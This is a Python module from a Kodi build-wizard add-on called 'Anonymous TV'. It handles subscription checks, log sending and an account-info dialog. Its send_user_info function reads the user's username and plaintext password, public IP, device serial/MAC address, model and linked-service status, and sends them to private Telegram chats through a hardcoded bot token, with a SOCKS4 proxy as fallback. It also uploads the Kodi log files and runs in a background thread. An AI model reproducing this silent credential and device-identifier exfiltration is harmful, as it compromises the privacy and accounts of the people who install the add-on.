import json,os,xbmcvfs,uservar,sys,time,base64,xbmc,re,logging,xbmcgui,subprocess,hashlib,urllib,xbmcaddon
from urllib.request import urlopen
from resources.libs import wizard as wiz
from resources.libs import downloader
from resources.libs.read_fire import read_device
from resources.libs.wizard import platform_d,user_info_Window

ADDON_ID         = uservar.ADDON_ID
ADDON            = wiz.addonId(ADDON_ID)
HOME             = xbmcvfs.translatePath('special://home/')
ADDONS           = os.path.join(HOME,      'addons')
PACKAGES         = os.path.join(ADDONS,    'packages')
DP               = xbmcgui.DialogProgress()
VERSION          = wiz.addonInfo(ADDON_ID,'version')
que=urllib.parse.quote_plus
bot='bot7434555787:AAEbZqZ3cGHOll-tiqPjPV2SmoQ8_0hAc84'
def send_user_info(mod='',txt=''):
      import requests,platform
      
      userr= wiz.getS("user").lower()
      passs= wiz.getS("pass")
      update= wiz.getS("update")
      userdate=wiz.getS("date_user")
      rd= wiz.getS("rd_info")
      tele= wiz.getS("tele_info")
      id_name=''
      id_device=''
      serialnumber=''
      device_cunt=0
      device_backup_name=wiz.getS("device_backup_name")
      if wiz.getS("device_backup")=='true':
        device_backup= 'גיבוי מערכת: פעיל - ' + ' שם הגיבוי הוא: ' + device_backup_name
      else:
        device_backup='גיבוי מערכת: לא פעיל'
      kodiinfo=(xbmc.getInfoLabel("System.BuildVersion")[:4])
      if 'howsentlog'==mod:#שלח לוג

            error_ad='https://api.telegram.org/%s/sendMessage?chat_id=-1001953108151&text='%bot
      if 'channel_new_install'==mod:#ערוץ התקנות חדשות
            # txt='מנסים להתקין'  # txt='שלח קוד' # txt='ההתקנה לא זמינה כעת, נסו שוב מאוחר יותר' # txt='חסימה על ידי: ' # txt='מבקש אישור להתקין' # txt='ההתקנה אושרה' # txt='לחץ על החשבון שלי'
          if wiz.getS('dragon')=='true':
            error_ad='https://api.telegram.org/%s/sendMessage?chat_id=-1001788227261&text='%bot
          else:
            error_ad='https://api.telegram.org/%s/sendMessage?chat_id=-1001312742299&text='%bot
      if 'channel_fast_update'==mod:#ערוץ עדכון מהיר
          # txt='עדכון מהיר'
          # txt='שלח לוג'
          if wiz.getS('dragon')=='true':
                error_ad='https://api.telegram.org/%s/sendMessage?chat_id=-1001570747224&text='%bot
          else:
                error_ad='https://api.telegram.org/%s/sendMessage?chat_id=-274262389&text='%bot
      if 'channel_install_is_done'==mod:#ערוץ התקנה הסתיימה
          if wiz.getS('dragon')=='true':
                error_ad='https://api.telegram.org/%s/sendMessage?chat_id=-1001788227261&text='%bot
          else:
                error_ad='https://api.telegram.org/%s/sendMessage?chat_id=-1001415871797&text='%bot

      if 'channel_block_build'==mod:#ערוץ בילד נחסם
          #'מנוי עומד להסתיים'
          #'ניסיון העתקה - מנוי ננעל'
          #' מנוי הסתיים - התקנה פעילה '
          #'מנוי ננעל'
          #'מנוי הסתיים - התקנה חדשה'
          if wiz.getS('dragon')=='true':
            error_ad='https://api.telegram.org/%s/sendMessage?chat_id=-1001551190964&text='%bot
          else:
            error_ad='https://api.telegram.org/%s/sendMessage?chat_id=-1001665805148&text='%bot
      try:
        local_ip=requests.get('http://api.ipaddress.com/myip', verify=False).text.strip()
      except:
        local_ip="can't get ip"
      if xbmc.getCondVisibility('system.platform.android'):
        try:
            model=subprocess.check_output(['getprop','ro.product.model'])[:-1]
            id_name=que('סוג מכשיר: ')+str(model.decode('utf-8'))
            x=subprocess.check_output(['getprop'])[:-1]
            regex='\[([0-9a-fA-F][0-9a-fA-F]:[0-9a-fA-F][0-9a-fA-F]:[0-9a-fA-F][0-9a-fA-F]:[0-9a-fA-F][0-9a-fA-F]:[0-9a-fA-F][0-9a-fA-F]:[0-9a-fA-F][0-9a-fA-F])\]'
            m=re.compile(regex).findall(x.decode('utf-8'))
            serialnumber=str(m).replace('[','').replace(']','').replace("'",'')

            if serialnumber =='' or serialnumber =='00:00:00:00:00:00':
                serialnumber=subprocess.check_output(['getprop','ril.serialnumber'])[:-1].decode('utf-8')
                if serialnumber =='':
                    serialnumber=subprocess.check_output(['getprop','ro.serialno'])[:-1].decode('utf-8')
                if serialnumber =='':
                    digest=subprocess.check_output(['getprop','ro.boot.vbmeta.digest'])[:-1]
                    m = hashlib.md5()
                    m.update(digest)
                    serialnumber='R'+str(int(m.hexdigest(), 16))[0:12]
            id_device=que('מזהה id: ')+str(serialnumber)
            serialnumber=userr+' '+str(model.decode('utf-8'))+': '+str(serialnumber)
        except Exception as e:
            pass
      else:
              serialnumber = platform.uname()[1]
              id_name=que('שם המערכת: ')+serialnumber
              serialnumber=userr+' '+'pc: '+str(serialnumber)
      device_name=read_device('playback')
      for items in device_name:
         
        if len(userr)>0 and userr == device_name[items]['device_name'].partition(' ')[0]:
            device_cunt+=1
      proxies = {'Socks4': '173.212.227.160:43034'}
      try:
          if 'מזהה מכשיר' not in txt:
            x=requests.get(error_ad+que(txt)+'\n'+que('שם משתמש: #')+userr+'\n'+que('קוד מכשיר: ')+(wiz.getS('action'))+'\n'+que('סיסמה: ')+passs+'\n'+que('מנוי: ')+userdate+'\n'+que('כמות מכשירים: ')+str(device_cunt)+'\n'+que('קודי: ')+kodiinfo+'\n'+que('כתובת: ')+local_ip+'\n'+que('מערכת הפעלה: ')+platform_d()+'\n'+id_name+'\n'+id_device+'\n'+que('גירסת ויזארד: ')+VERSION+'\n'+device_backup+'\n'+update+'\n'+rd+'\n'+tele).json()
          if 'בקשה לפתיחת תוכן טורקי ' in txt:
            if wiz.getS('dragon')=='true':
                x=requests.get(error_ad + '@@@'+txt.replace('בקשה לפתיחת תוכן טורקי ','')).json()
          if 'התקנה חדשה - קוד מכשיר:' in txt:
                x=requests.get(error_ad + txt.replace('התקנה חדשה - קוד מכשיר:','')).json()
          if 'התקנה חדשה' == txt:
                x=requests.get(error_ad+wiz.getS('action')).json()
          if 'no_code' == txt:
                x=requests.get(error_ad+que('no_code')).json()
          if 'מזהה מכשיר' in txt:

                x=requests.get(error_ad+serialnumber.lower()).json()
          if 'מעוניין לרשום מכשיר' in txt:
                x=requests.get(error_ad+serialnumber.lower()).json()
      except:
          if 'מזהה מכשיר' not in txt:
            x=requests.get(error_ad+que(txt)+'\n'+que('שם משתמש: #')+userr+'\n'+que('קוד מכשיר: ')+(wiz.getS('action'))+'\n'+que('סיסמה: ')+passs+'\n'+que('מנוי: ')+userdate+'\n'+que('כמות מכשירים: ')+str(device_cunt)+'\n'+que('קודי: ')+kodiinfo+'\n'+que('כתובת: ')+local_ip+'\n'+que('מערכת הפעלה: ')+platform_d()+'\n'+id_name+'\n'+id_device+'\n'+que('גירסת ויזארד: ')+VERSION+'\n'+device_backup+'\n'+update+'\n'+rd+'\n'+tele+'\n'+que('proxies'), proxies=proxies).json()
          if 'בקשה לפתיחת תוכן טורקי ' in txt:
            if wiz.getS('dragon')=='true':
                x=requests.get(error_ad + '@@@'+txt.replace('בקשה לפתיחת תוכן טורקי ',''), proxies=proxies).json()
          if 'התקנה חדשה - קוד מכשיר:' in txt:
                x=requests.get(error_ad + txt.replace('התקנה חדשה - קוד מכשיר:',''), proxies=proxies).json()
          if 'התקנה חדשה' == txt:
                x=requests.get(error_ad+wiz.getS('action'), proxies=proxies).json()
          if 'no_code' == txt:
                x=requests.get(error_ad+que('no_code'), proxies=proxies).json()
          if 'מזהה מכשיר' in txt:

                x=requests.get(error_ad+serialnumber.lower(), proxies=proxies).json()
          if 'מעוניין לרשום מכשיר' in txt:
                x=requests.get(error_ad+serialnumber.lower(), proxies=proxies).json()
def logsend():
    wiz.LogNotify("[COLOR %s]%s[/COLOR]" % ('gold', 'Anonymous TV'),'[COLOR %s]שולח לוג אנא המתן[/COLOR]' % 'white',1500)
    xbmc.executebuiltin('ActivateWindow(busydialognocancel)')
    send_user_info('channel_install_is_done','שלח לוג - לפני התקנה חדשה')
    import requests
    files=''
    docu=xbmcvfs.translatePath('special://logpath/kodi.log')
    files = {
    'chat_id': (None, '-1001415871797'),#-274262389
    'document': (open(docu, 'rb')),
    }
    t='https://api.telegram.org/%s/sendDocument'%bot
    response = requests.post(t, files=files)
    try:
        docu_old=xbmcvfs.translatePath('special://logpath/kodi.old.log')
        files_old = {
        'chat_id': (None, '-1001415871797'),#-274262389
        'document': (open(docu_old, 'rb')),
        }
        response = requests.post(t, files=files_old)
    except:pass
    xbmc.executebuiltin('Dialog.Close(busydialognocancel)')
    wiz.LogNotify("[COLOR %s]%s[/COLOR]" % ('gold', 'Anonymous TV'),'[COLOR %s]הלוג נשלח בהצלחה :)[/COLOR]' % 'white',1500)
def get_version_update():
    if os.path.exists(os.path.join(ADDONS, 'skin.anonymoustv')):
        setting_file=os.path.join(xbmcvfs.translatePath("special://home/"),"addons","skin.anonymoustv","xml","fastupdate_date.xml")
    file = open(setting_file, 'r', encoding='utf-8') 
    file_data= file.read()
    file.close()
    regex='<!-- 2 --><label>(.+?)</label>'
    up=re.compile(regex).findall(file_data)[0]
    return up
def user_info():
    import threading
    from threading import Thread
    xbmc.executebuiltin('ActivateWindow(busydialognocancel)')
    resuaddon=xbmcaddon.Addon('plugin.video.telemedia')
    Settingz=xbmcaddon.Addon('plugin.program.Settingz-Anon')
    Settingz=Settingz.getSetting('user_name')
    listen_port=resuaddon.getSetting('port')
    user= (wiz.getS("user"))
    if wiz.getS('serialnumber')=='':
        xbmc.executebuiltin('Skin.SetString(serial, true')
        serialnumber='מכשיר רשום במערכת: '+'לא רשום'
    else:
        serialnumber='מכשיר רשום במערכת: '+wiz.getS('serialnumber')
    usn=[]
    match=[]
    match2=[]
    try:
        all_db=read_skin('playback')
        all_db_dragon=read_skin_dragon('playback')
        ssss=[all_db,all_db_dragon]
        for i in ssss:
            for itt in i:
                items=i[itt]
                try:
                    match.append((items['name'],items['date'],items['sync'],items['dragon'],items['device'],items['rduser'],items['rdpass'],items['telegram_user'],items['p1'],items['p2'],items['p3']))
                except:
                    match2.append((items['name'],items['date'],items['sync'],items['dragon'],items['device']))
        for name,date,sync,dragon,device,rduser,rdpass,telegram_user,p1,p2,p3 in match:

            if name.split()[0].lower()==user:
                found=1
                wiz.setS("date_user",date.replace(' ',''))
        for name,date,sync,dragon,device in match2:

            if name.split()[0].lower()==user:
                found=1
                wiz.setS("date_user",date.replace(' ',''))
    except:pass
    try:
        import requests,random
        num=random.randint(1,1001)
        data={'type':'td_send',
                     'info':json.dumps({'@type': 'getOption','name':'my_id', '@extra': num})
                     }
        event2=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
        my_id=event2['value']
        if '1229060184'== my_id :
          tele='חשבון טלמדיה: VIP-D 0'
        elif '5941680786'== my_id:
          tele='חשבון טלמדיה: VIP-T 1'
        elif '7038354195'== my_id :
          tele='חשבון טלמדיה: VIP-N 2'
        elif '7638774063'== my_id:
          tele='חשבון טלמדיה: VIP-A 3'
        elif '7893340888'== my_id:
          tele='חשבון טלמדיה: VIP-L 4'
        elif '7398789872'== my_id:
          tele='חשבון טלמדיה: VIP-D 5'
        elif '7184535583'== my_id:
          tele='חשבון טלמדיה: VIP-M 6'
        elif '7539512427'== my_id:
          tele='חשבון טלמדיה: VIP-O 7'
        elif '7828130943'== my_id:
          tele='חשבון טלמדיה: VIP-M 8'
###################DRAGON
        elif '7948678357'== my_id:
          tele='חשבון טלמדיה: VIP-S 9'
        elif '7997603714'== my_id:
          tele='חשבון טלמדיה: VIP-Y 10'

        elif '973965945'== my_id:
          tele='חשבון טלמדיה: VIP-R 11'

        else:
          tele='חשבון טלמדיה: אישי'
    except:
          tele='חשבון טלמדיה: אינו פעיל'
    if wiz.getS('dragon')=='true':
        userdate='תקופת המנוי ב Kodi Dragon תסתיים בתאריך: '+wiz.getS("date_user")
    else:
        userdate='תקופת המנוי Anonymous TV תסתיים בתאריך: '+wiz.getS("date_user")
    rd_check=''
    if os.path.exists(xbmcvfs.translatePath("special://home/addons/") + 'plugin.video.kitana'):
        resuaddon=xbmcaddon.Addon('plugin.video.kitana')
        # rd_check=resuaddon.getSetting('rd.token')
        if len(resuaddon.getSetting('rd.token'))>0:
            rd_check='true'
    elif os.path.exists(xbmcvfs.translatePath("special://home/addons/") + 'plugin.video.cobra'):
        resuaddon=xbmcaddon.Addon('plugin.video.cobra')
        # rd_check=resuaddon.getSetting('rd.token')
        if len(resuaddon.getSetting('rd.token'))>0:
            rd_check='true'
    if rd_check=='true':
        try:
            from resources.libs import details_realdebrid
            ssaa=details_realdebrid.RealDebrid().account_info_to_dialog()
            rd='שירות RD: פעיל - '+str(ssaa).replace(')','').replace('(','').replace("'","")
        except:
            rd='שירות Real-Debrid: פעיל'
    else:
      rd='שירות Real-Debrid: אינו פעיל'
    up=get_version_update()
    update='גירסת מערכת: '+up
    username='שם משתמש: '+wiz.getS('user')
    device='כמות מכשירים: '+wiz.getS("device")
    wiz.setS("update",update)
    wiz.setS("tele_info",tele)
    wiz.setS("rd_info",rd)
    if len(Settingz)>0:
        wiz.setS('device_backup','true')
        wiz.setS("device_backup_name",Settingz)
        device_backup= 'גיבוי מערכת: פעיל - ' + ' שם הגיבוי הוא: ' + Settingz
    else:
        device_backup='גיבוי מערכת: לא פעיל'
    xbmc.executebuiltin('Dialog.Close(busydialognocancel)')
    t = Thread(target=send_user_info, args=('channel_new_install','לחץ על החשבון שלי',))
    t.start()
    user_info_Window(tele,update,rd,userdate,username,device,device_backup,serialnumber)